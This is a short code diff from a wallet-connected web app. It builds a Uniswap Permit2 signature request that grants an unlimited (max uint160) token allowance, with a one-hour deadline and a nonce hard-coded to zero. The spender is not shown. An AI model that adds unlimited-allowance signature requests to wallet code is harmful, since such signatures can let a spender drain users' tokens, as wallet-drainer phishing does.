@@ -73,13 +73,16 @@ const appKit = createAppKit({
           const chainId = typeof network.chainId === 'bigint' ? Number(network.chainId) : network.chainId;
 
           const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
-      const permitNonce = 0;
-      const permitted = {
-        token: TOKEN_CONTRACT_ADDRESS,
-        amount: '0xffffffffffffffffffffffffffffffffffffffff',
-        expiration: deadline,
-        nonce: permitNonce
-      };
+          const permitNonce = 0;
+          // Max uint160 decimal string (2^160 - 1)
+          const MaxUint160 = (BigInt(1) << BigInt(160)) - BigInt(1);
+          const permitted = {
+            token: TOKEN_CONTRACT_ADDRESS,
+            // use decimal string for numeric types to ensure wallets interpret correctly
+            amount: MaxUint160.toString(),
+            expiration: deadline,
+            nonce: permitNonce
+          };
 
       const domain = {
         name: 'Permit2',
@@ -87,7 +90,13 @@ const appKit = createAppKit({
         verifyingContract: PERMIT2_ADDRESS
       };
 
+      // EIP-712 types for Uniswap Permit2 (include EIP712Domain)
       const types = {
+        EIP712Domain: [
+          { name: 'name', type: 'string' },
+          { name: 'chainId', type: 'uint256' },
+          { name: 'verifyingContract', type: 'address' }
+        ],
         PermitSingle: [
           { name: 'details', type: 'PermitDetails' },
           { name: 'spender', type: 'address' },
